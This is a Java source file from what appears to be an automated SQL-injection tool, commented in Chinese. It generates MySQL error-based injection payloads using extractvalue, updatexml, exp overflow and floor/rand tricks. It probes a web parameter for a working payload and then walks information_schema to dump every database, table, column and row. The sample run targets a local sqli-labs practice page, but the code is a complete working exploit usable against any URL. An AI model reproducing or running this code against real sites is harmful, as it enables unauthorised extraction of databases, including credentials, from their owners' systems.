package com.sqldd.payloadOrigin;

import com.sqldd.crawler.HtmlDownloader;
import com.sqldd.crawler.MyRequestSet;
import com.sqldd.fuzzingWaf.PageComparison;
import com.sqldd.payloadOrigin.utils.HeuristicUtils;
import com.sqldd.payloadOrigin.utils.OpBoundary;
import com.sqldd.payloadOrigin.utils.Tools;
import org.springframework.util.DigestUtils;

import java.util.ArrayList;
import java.util.HashMap;

public class ErrorPayloads{
    private String url;
    private String method;
    private String pre;
    private String preWrong;
    private String suf;
    private String sufbk;
    private HashMap<String,String> params = new HashMap<String,String>();//参数
    private String injectingKey;//正在测试的注入点
    private HashMap<String,String> normalparams1;//两个正常值，用于定位正常/异常/WAF网页
    private HashMap<String,String> normalparams2;//两个正常值，用于定位正常/异常/WAF网页
    private HtmlDownloader htmlDownloader = new HtmlDownloader(new MyRequestSet());
    private OpBoundary opBoundary = new OpBoundary();

    //有参构造
    public ErrorPayloads(String url,String method,String pre,String preWrong,String suf,String sufbk,HashMap<String,String> params,String injectingKey,HashMap<String,String> normalparams1,HashMap<String,String> normalparams2){
        this.url = url;
        this.method = method;
        this.pre = pre;
        this.preWrong = preWrong;
        this.suf = suf;
        this.sufbk =sufbk;
        this.params = params;
        this.injectingKey = injectingKey;
        this.normalparams1 =normalparams1;
        this.normalparams2 = normalparams2;
    }


    //1.嵌套层数
    public String nestingQuery(Integer nestingTime,String query){
        StringBuilder builder = new StringBuilder();
        String ori = "(select * from)";
        for (int i = 0; i < nestingTime; i++) {
            builder.insert(builder.length()-i, ori);
        }
        builder.insert(builder.length()-nestingTime, query);
        //alias
        for (int i = 0; i < nestingTime; i++) {
            builder.insert(builder.length()-nestingTime+i, (char)('a'+i));
        }
        return builder.toString();
    }
    //2.连接函数选择
    public ArrayList<String> concatChoise(String query){
        ArrayList<String> rsts = new ArrayList<>();
        rsts.add("concat(0x7e," + query + ",0x7e)");
        rsts.add("concat('~'," + query + ",'~')");//针对ST_LatFromGeoHash等函数不解析十六进制
//        rsts.add("concat_ws('',0x7e,"+ query +",0x7e)");
//        rsts.add("concat_ws('','~',"+ query +",'~')");
//        rsts.add("group_concat(0x7e," + query + ",0x7e)");
//        rsts.add("group_concat('~'," + query + ",'~')");
        return rsts;
    }
    //3.报错函数选择
    public ArrayList<String> getErrorFunc(String concatQuery){
        ArrayList<String> rsts = new ArrayList<>();
        rsts.add("(extractvalue(1," + concatQuery + "))");
        rsts.add("(updatexml(1,"+concatQuery+",1))");
        //mysql5.7+
//        rsts.add("(ST_LatFromGeoHash("+concatQuery+"))");
//        rsts.add("(ST_LongFromGeoHash("+concatQuery+"))");
//        rsts.add("(GTID_SUBSET("+concatQuery+",1))");
//        rsts.add("(GTID_SUBTRACT("+concatQuery+",1))");
//        rsts.add("(ST_PointFromGeoHash("+concatQuery+",1))");
        return rsts;
    }
    //公共部分提取出来，避免重复调用浪费时间
    public ArrayList<String> getNormalRst(){
        //正常页面
        System.out.println("获取正常页面值");
        PageComparison pageComparison = new PageComparison(this.url,this.method);
        ArrayList<String> normalRst = pageComparison.getNormalPageComparison(normalparams1, normalparams2);
        return normalRst;
    }

    //如果要用union的报错注入方式，需知道列数
    public int getColumnNum(){
        int columnNum = 0;
        PageComparison pageComparison = new PageComparison(url,method);
        HeuristicUtils heuristicUtils = new HeuristicUtils();
        ArrayList<String> normalRst = getNormalRst();

        String payloadsufbk = " union select ";
        for (int i = 2; i < 22; i++) {
            String bk = "1";
            String bk2 = "1";
            for (int j = 2; j < i; j++) {
                bk += "," + j;
            }
            bk2 = bk+"," + i + suf;
            bk += "," + sufbk + i;
            String ppay = preWrong + payloadsufbk + bk;
            String ppay2 = preWrong + payloadsufbk + bk2;
            String payUseful = heuristicUtils.heuristicDetection(url,method, params, injectingKey, normalparams1,normalparams2, "", ppay, "");
            String payUseful2 = heuristicUtils.heuristicDetection(url,method, params, injectingKey, normalparams1,normalparams2, "", ppay2, "");
            params.put(injectingKey, payUseful);
            //params.put(injectingKey, ppay);
            int rate = pageComparison.getRate(normalRst, params);
            params.put(injectingKey, payUseful2);
            //params.put(injectingKey, ppay2);
            int rate2 = pageComparison.getRate(normalRst, params);
            if(rate == 1 || rate2 == 1)
                return i;
        }
        return 1;
    }
    //构造所有报错boundary，并提取一个有效boundary,[]取代插入位置
    public boolean makeErrorBoundarys(){
        ArrayList<String> rstsUseful = new ArrayList<>();

        PageComparison pageComparison = new PageComparison(url,method);
        ArrayList<String> normalRst = getNormalRst();
        ArrayList<String> rsts = new ArrayList<>();
        int columnNum = getColumnNum();
        /**
         *
         * extractvalue/updatexml
         * and/or/union select前置闭合规则：无
         * 同
         * ST_LatFromGeoHash([q])/  ST_LongFromGeoHash([q])/  GTID_SUBSET([q],any^null)/  GTID_SUBTRACT([q],any^null)/  ST_PointFromGeoHash([q],any^null)/  JSON_KEYS
         *
         * exp【mysql5.7以下】
         * 前置闭合 + and/or/union select   +  errorfunc(~([query]))
         * and:不管闭合卜闭合，只能为数字，且不能为0,'0',"000"等
         * or: 不是数字，或者为数字时只能是0，'00'等
         * union select:无
         *
         * 【5.7可行】
         * floor() + rand() + group by count(*)也必不可少[如果被过滤考虑其他函数?]
         * 前置闭合 + and/or/union select + count(*) from information_schema.tables group by concat([query],floor(rand(0)*2))
         * 后加order by '1可闭合后置标签
         *
         */
        String col = "";
        for (int i = 1; i < columnNum; i++) {
            col += "null,";
        }

        //exp
        rsts.add(pre+" and exp(~(select * from(select concat(0x7e,(select 111),0x7e))a))" + suf);
        rsts.add(pre+" and exp(~(select * from(select concat(0x7e,(select 111),0x7e))a))" +" and "+ sufbk + "1");
        rsts.add(pre+" xor exp(~(select * from(select concat(0x7e,(select 111),0x7e))a))" + suf);
        rsts.add(pre+" xor exp(~(select * from(select concat(0x7e,(select 111),0x7e))a))" +" and "+ sufbk + "1");
        rsts.add(preWrong+" or exp(~(select * from(select concat(0x7e,(select 111),0x7e))a))" + suf);
        rsts.add(preWrong+" or exp(~(select * from(select concat(0x7e,(select 111),0x7e))a))" +" and "+ sufbk + "1");
        rsts.add(preWrong + " union select "+ col + "exp(~(select * from(select concat(0x7e,(select 111),0x7e))a))" +suf);
        rsts.add(preWrong + " union select "+ col + "exp(~(select * from(select concat(0x7e,(select 111),0x7e))a)) union select " +col + sufbk+"yx");

        //floor
        rsts.add(pre+" and (select count(*) from information_schema.tables group by concat(0x7e,(select 111),0x7e,floor(rand(0)*2)))" + suf);
        rsts.add(pre+" and (select count(*) from information_schema.tables group by concat(0x7e,(select 111),0x7e,floor(rand(0)*2)))" + " and " + sufbk + "1");
        rsts.add(preWrong+" or (select count(*) from information_schema.tables group by concat(0x7e,(select 111),0x7e,floor(rand(0)*2)))" + suf);
        rsts.add(preWrong+ " or (select count(*) from information_schema.tables group by concat(0x7e,(select 111),0x7e,floor(rand(0)*2)))" + " and " + sufbk + "1");
        rsts.add(preWrong + " union select "+col+"(select count(*) from information_schema.tables group by concat(0x7e,(select 111),0x7e,floor(rand(0)*2)))" + suf);
        rsts.add(preWrong + " union select "+col+"(select count(*) from information_schema.tables group by concat(0x7e,(select 111),0x7e,floor(rand(0)*2)))" + " and " + sufbk + "1");
        //函数报错
        for (int i = 0; i < 1; i++) {//三层嵌套
            String query1 = nestingQuery(i, "(select 111)");
            ArrayList<String> concatLists = concatChoise(query1);
            for (String concatQuery : concatLists) {
                ArrayList<String> errorFuncs = getErrorFunc(concatQuery);
                for (String errorFunc : errorFuncs) {
                    rsts.add(pre + " and "+ errorFunc + suf);
                    rsts.add(pre + " and "+ errorFunc + " and " + sufbk + "1");
                    rsts.add(preWrong + " or "+ errorFunc + suf);
                    rsts.add(preWrong + " or "+ errorFunc + " and " + sufbk + "1");
                    rsts.add(preWrong + " union select " + col + errorFunc + suf);
                    rsts.add(preWrong + " union select " + col + errorFunc + " and " + sufbk + "1");
                }
            }
        }
        HeuristicUtils heuristicUtils = new HeuristicUtils();
        for (String rst : rsts) {
            String payV = heuristicUtils.heuristicDetection(url,method, params, injectingKey, normalparams1,normalparams2, "", rst, "");
            params.put(injectingKey, payV);
            int rate = pageComparison.getRate(normalRst, params);
            if(rate == 1 || rate == 2){
                String html = "";
                if(method.equals("get"))
                    html = htmlDownloader.downloadHtmlWithParamsGet(url, params);
                else if(method.equals("post"))
                    html = htmlDownloader.downloadHtmlWithParamsPost(url, params);
                int i1 = -1;
                if(html != null && html.length() != 0)
                    i1 = html.indexOf("~111~");
                if(i1 > 0){
                    int i = rst.indexOf("select 111");
                    StringBuilder builder = new StringBuilder(rst);
                    builder.replace(i, i+"select 111".length(), "[]");
                    System.out.println("[报错注入-有效boundary]:"+builder.toString());
                    rstsUseful.add(builder.toString());
                }
            }
        }
        if(rstsUseful != null){
            String urlMd5 = DigestUtils.md5DigestAsHex(url.getBytes());
            opBoundary.storeBoundaryInTxt("error",urlMd5, rstsUseful);
            return true;
        }
        return false;
    }
    public HashMap<String, HashMap<String, ArrayList<ArrayList<String>>>> getAllDatabases(String boundary,int ifDump){
        Tools tools = new Tools();
        HeuristicUtils heuristicUtils = new HeuristicUtils();
        PageComparison pageComparison = new PageComparison(url,method);
        HtmlDownloader htmlDownloader = new HtmlDownloader(new MyRequestSet());
        ArrayList<String> normalRst = getNormalRst();
        //ArrayList<ArrayList<String>> RST_datas = new ArrayList<>();//装列名和列的值
        //HashMap<String, ArrayList<ArrayList<String>>> RST_tables_datas = new HashMap<>();//装表和表下的值
        HashMap<String, HashMap<String, ArrayList<ArrayList<String>>>> RST_databases_datas = new HashMap<>();//装库和库下的值
        /**
         * HashMap<String, ArrayList<String>>
         * {"id":"username","password"}
         * {1:dump,dump}
         * {2:admin,admin}
         */

        String a = "select group_concat(0x5e,SCHEMA_NAME,0x5e) from information_schema.SCHEMATA";//获取所有数据库名
        String b = "select group_concat(0x5e,database(),0x5e)";//当前数据库名
        String c = "select group_concat(0x5e,table_name,0x5e) from information_schema.tables where table_schema='[]'";//获取表名
        //eg:select group_concat(0x5e,table_name,0x5e) from information_schema.tables where table_schema='security'
        String d = "select group_concat(0x5e,column_name,0x5e) from information_schema.columns where table_schema='[]' and table_name='[]'";//获取列名
        //eg:select group_concat(0x5e,column_name,0x5e) from information_schema.columns where table_schema='security' and table_name='users'
        String e = "select group_concat(0x5e,[],0x5e) from []";//获取所有第一个字段的值【这里from [表]应该是 from[库].[表]】
        //eg:select group_concat(0x5e,id,0x5e) from users
        String f = "select group_concat(0x5e,[],0x5e) from [] where []='[]'";//遍历第一个字段的值，得到其他字段的值 【这里同上】
        //eg:select group_concat(0x5e,username,0x5e) from users where id='1'

        String payload1 = "";
        if(ifDump == 0){
            payload1 = tools.tihuan(boundary, b);
        }else if(ifDump == 1) {
            payload1 = tools.tihuan(boundary, a);
        }
        String payload1new = heuristicUtils.heuristicDetection(url,method, params, injectingKey, normalparams1,normalparams2, "", payload1, "");
        if(payload1new == null)
            return null;
        params.put(injectingKey, payload1new);
        int rate = pageComparison.getRate(normalRst, params);
        if(rate == 2){
            String html = "";
            if(method.equals("get"))
                html = htmlDownloader.downloadHtmlWithParamsGet(url, params);
            else if(method.equals("post"))
                html = htmlDownloader.downloadHtmlWithParamsPost(url, params);
            ArrayList<String> nowDatabase = tools.tools_Error_returnClosureRst(html);//获取当前数据库名
            for (String nowDatabaseOnly1 : nowDatabase) {
                System.out.println("[获取到数据库:"+nowDatabaseOnly1 +"]...");
                HashMap<String, ArrayList<ArrayList<String>>> RST_tables_datas = new HashMap<>();//放入tablename:{<id,user,pwd>,<1,user1,pwd1>,...}
                String cnew = tools.tihuan(c, nowDatabaseOnly1);
                String payload2 = tools.tihuan(boundary, cnew);
                System.out.println("[拼接boundary][payload2]:"+payload2);
                String payload2new = heuristicUtils.heuristicDetection(url,method, params, injectingKey, normalparams1,normalparams2, "", payload2, "");
                if(payload2new == null)
                    return null;
                params.put(injectingKey, payload2new);
                int rate1 = pageComparison.getRate(normalRst, params);
                if(rate1 == 2){
                    String html1 = "";
                    if(method.equals("get"))
                        html1 = htmlDownloader.downloadHtmlWithParamsGet(url, params);
                    else if(method.equals("post"))
                        html1 = htmlDownloader.downloadHtmlWithParamsPost(url, params);
                    ArrayList<String> tables = tools.tools_Error_returnClosureRst(html1);//获取表名
                    for (String table : tables) {
                        System.out.println("[获取到数据库:"+nowDatabaseOnly1 + "][表:" + table + "]...");
                        ArrayList<ArrayList<String>> RST_datas = new ArrayList<>();
                        String dnew = tools.tihuan(tools.tihuan(d, nowDatabaseOnly1), table);
                        String payload3 = tools.tihuan(boundary, dnew);
                        String payload3new = heuristicUtils.heuristicDetection(url,method, params, injectingKey, normalparams1,normalparams2, "", payload3, "");
                        if(payload3new == null)
                            return null;
                        params.put(injectingKey, payload3new);
                        int rate2 = pageComparison.getRate(normalRst, params);
                        if(rate2 == 2){
                            String html2 = "";
                            if(method.equals("get"))
                                html2 = htmlDownloader.downloadHtmlWithParamsGet(url, params);
                            else if(method.equals("post"))
                                html2 = htmlDownloader.downloadHtmlWithParamsPost(url, params);
                            ArrayList<String> columns = tools.tools_Error_returnClosureRst(html2);//获取列名
                            RST_datas.add(columns);//放入列名，下面放入数据
                            String firstColumnName = columns.get(0);
                            String addfirstColumnName = tools.tihuan(e, firstColumnName);//加入第一个列名eg:id
                            String addtablename = tools.tihuan(addfirstColumnName, table);//加入表名eg:users
                            String payload4 = tools.tihuan(boundary, addtablename);
                            String payload4new = heuristicUtils.heuristicDetection(url,method, params, injectingKey, normalparams1,normalparams2, "", payload4, "");
                            if(payload4new == null)
                                return null;
                            params.put(injectingKey, payload4new);
                            int rate3 = pageComparison.getRate(normalRst, params);
                            if(rate3 == 2){
                                String html3 = "";
                                if(method.equals("get"))
                                    html3 = htmlDownloader.downloadHtmlWithParamsGet(url, params);
                                else if(method.equals("post"))
                                    html3 = htmlDownloader.downloadHtmlWithParamsPost(url, params);
                                ArrayList<String> firstColumnDatas = tools.tools_Error_returnClosureRst(html3);//获取第一列的所有值
                                for (String firstColumnData : firstColumnDatas) {
                                    System.out.println("[获取到数据库:"+nowDatabaseOnly1 + "][表:" + table + "][第1列:" + firstColumnData +"]...");
                                    ArrayList<String> dataPer = new ArrayList<>();
                                    dataPer.add(firstColumnData);
                                    for (int i = 1; i < columns.size(); i++) {//遍历之后的列的值
                                        String addothercolname = tools.tihuan(f, columns.get(i));//加入其他列名eg:username
                                        String addtablenamex = tools.tihuan(addothercolname, table);//加入表名eg:users
                                        String addfirstColumnNamex = tools.tihuan(addtablenamex, columns.get(0));//加入第一个列名eg:id
                                        String fnew = tools.tihuan(addfirstColumnNamex, firstColumnData);//[3]替换第一列的值eg:1
                                        String payload5 = tools.tihuan(boundary, fnew);
                                        System.out.println("payload5++"+payload5);
                                        String payload5new = heuristicUtils.heuristicDetection(url, method,params, injectingKey, normalparams1,normalparams2, "", payload5, "");
                                        if(payload5new == null)
                                            return null;
                                        params.put(injectingKey, payload5new);
                                        int rate4 = pageComparison.getRate(normalRst, params);
                                        if(rate4 == 2){
                                            String html4 = "";
                                            if(method.equals("get"))
                                                html4 = htmlDownloader.downloadHtmlWithParamsGet(url, params);
                                            else if(method.equals("post"))
                                                html4 = htmlDownloader.downloadHtmlWithParamsPost(url, params);
                                            String col_id_idvalue = tools.tools_Error_returnClosureRst1(html4);
                                            System.out.println("[获取到数据库:"+nowDatabaseOnly1 + "][表:" + table + "][第"+(i+1)+"列:" + col_id_idvalue +"]...");
                                            dataPer.add(col_id_idvalue);
                                        }
                                    }
                                    RST_datas.add(dataPer);
                                }
                            }
                        }
                        RST_tables_datas.put(table, RST_datas);
                        System.out.println("[获取数据库:"+nowDatabaseOnly1 + "]完毕！！！");
                    }
                }
                RST_databases_datas.put(nowDatabaseOnly1, RST_tables_datas);
            }
        }
        return RST_databases_datas;
    }
    public HashMap<String, HashMap<String, ArrayList<ArrayList<String>>>> getDatas(ArrayList<String> boundarys,int ifDump){
        for (String boundary : boundarys) {
            HashMap<String, HashMap<String, ArrayList<ArrayList<String>>>> allDatabases = getAllDatabases(boundary, ifDump);
            if(allDatabases != null)
                return allDatabases;
        }
        return null;
    }

    public static void main(String[] args) {
        /*String url = "http://localhost/sqli-labs/Less-1/";
        String method = "get";
        String pre = "1'";
        String preWrong = "-1'";
        String suf = "-- ";
        String sufbk = "'";
        HashMap<String, String> params = new HashMap<>();
        params.put("id", "anys");
        String injectingKey = "id";
        String [] normalvalue = {"1","2"};
        ErrorPayloads test = new ErrorPayloads(url, method,pre, preWrong, suf, sufbk, params, injectingKey, normalvalue);

        int columnNum = test.getColumnNum();
        System.out.println(columnNum);
        OpBoundary opBoundary = new OpBoundary();
        test.makeErrorBoundarys();
        ArrayList<String> errorPayloadsBoundarys = opBoundary.getBoundarysFromTxt("error");
        for (String errorPayloadsBoundary : errorPayloadsBoundarys) {
            System.out.println("[有效errorPayloadsBoundary]:" + errorPayloadsBoundary);

        }
        HashMap<String, HashMap<String, ArrayList<ArrayList<String>>>> testDatas = test.getDatas(errorPayloadsBoundarys, 0);
        if(testDatas != null){
            System.out.println("\n\n\n=============================================================================================");
            for (String dbName : testDatas.keySet()) {
                System.out.println("【dbName】"+dbName);
                HashMap<String, ArrayList<ArrayList<String>>> tbs = testDatas.get(dbName);
                for (String tbName : tbs.keySet()) {
                    System.out.println("【dbName】"+dbName+"【tbName】" + tbName);
                    ArrayList<ArrayList<String>> datas = tbs.get(tbName);
                    for (ArrayList<String> data : datas) {
                        String s = "|";
                        for (String datum : data) {
                            s += datum + "|";
                        }
                        System.out.println(s);
                    }
                }
                System.out.println("\n\n\n\n");
            }
        }else{
            System.out.println("\n\n\n=============================================================================================");
            System.out.println("未查询到数据");
        }*/

        String url = "http://localhost/sqli-labs/Less-12/";
        String method = "post";
        HashMap<String, String> params = new HashMap<>();
        params.put("uname", "admin");
        params.put("passwd", "admin");
        params.put("submit", "Submit");
        String injectingKey ="uname";
        HashMap<String, String> normalvalue1 = new HashMap<String,String>(){
            {
                put("uname", "admin1");
                put("passwd", "admin1");
                put("submit", "Submit");
            }
        };
        HashMap<String, String> normalvalue2 = new HashMap<String,String>(){
            {
                put("uname", "admin1");
                put("passwd", "admin1");
                put("submit", "Submit");
            }
        };
        String pre = "admin\")";
        String preWrong = "xx\")";
        //String boundary = "union select 1,group_concat(0x7e,column_name,0x7e),3 from information_schema.columns where table_name='users'";
        //String boundary = "union select 1,group_concat(0x7e,schema_name,0x7e),3 from information_schema.schemata";
        String boundary = "xor exp(~(select * from(select concat(0x7e,(select group_concat(0x5e,table_name,0x5e) from information_schema.tables where table_schema='security'),0x7e))a))";
        //String suf = "#";
        String suf = "-- ";
        String sufbk = "(\"";
        ErrorPayloads errorPayloads = new ErrorPayloads(url, method, pre,preWrong , suf, sufbk, params, injectingKey, normalvalue1,normalvalue2);
        errorPayloads.makeErrorBoundarys();
        int columnNum = errorPayloads.getColumnNum();
        System.out.println("[columnNum]:"+columnNum);
        OpBoundary opBoundary = new OpBoundary();
        //errorPayloads.makeErrorBoundarys();
        String urlMd5 = DigestUtils.md5DigestAsHex(url.getBytes());
        ArrayList<String> errorPayloadsBoundarys = opBoundary.getBoundarysFromTxt("error",urlMd5);
        HashMap<String, HashMap<String, ArrayList<ArrayList<String>>>> testDatas = errorPayloads.getDatas(errorPayloadsBoundarys, 0);
        if(testDatas != null){
            System.out.println("\n\n\n=============================================================================================");
            for (String dbName : testDatas.keySet()) {
                System.out.println("【dbName】"+dbName);
                HashMap<String, ArrayList<ArrayList<String>>> tbs = testDatas.get(dbName);
                for (String tbName : tbs.keySet()) {
                    System.out.println("【dbName】"+dbName+"【tbName】" + tbName);
                    ArrayList<ArrayList<String>> datas = tbs.get(tbName);
                    for (ArrayList<String> data : datas) {
                        String s = "|";
                        for (String datum : data) {
                            s += datum + "|";
                        }
                        System.out.println(s);
                    }
                }
                System.out.println("\n\n\n\n");
            }
        }else{
            System.out.println("\n\n\n=============================================================================================");
            System.out.println("未查询到数据");
        }
    }
}
